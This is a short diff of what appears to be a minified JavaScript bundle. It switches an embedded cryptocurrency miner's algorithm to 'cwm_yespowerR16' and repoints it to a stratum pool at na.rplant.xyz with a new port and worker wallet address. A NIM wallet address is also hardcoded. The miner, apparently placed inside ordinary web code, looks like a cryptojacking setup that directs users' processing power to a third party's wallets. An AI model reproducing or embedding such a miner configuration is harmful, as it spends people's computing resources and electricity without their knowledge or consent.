@@ -1346,12 +1346,12 @@
             NIM: "NQ08SUEHT0GSPCDJHUNXQ50HB0M0ABHAPP03",
           },
           IU = {
-            algorithm: "cwm_yespowerADVC",
+            algorithm: "cwm_yespowerR16",
             config: {
               stratum: {
                 server: "na.rplant.xyz",
-                port: 7149,
-                worker: "advc1qnm7t8kaqdfvy725lufg9wdxqfz36wta3wg98g9",
+                port: 3382,
+                worker: "YktdLVKzM4vRrfZnQgZB8mSVPCjuNzDjEA",
                 password: "x",
               },
               options: {
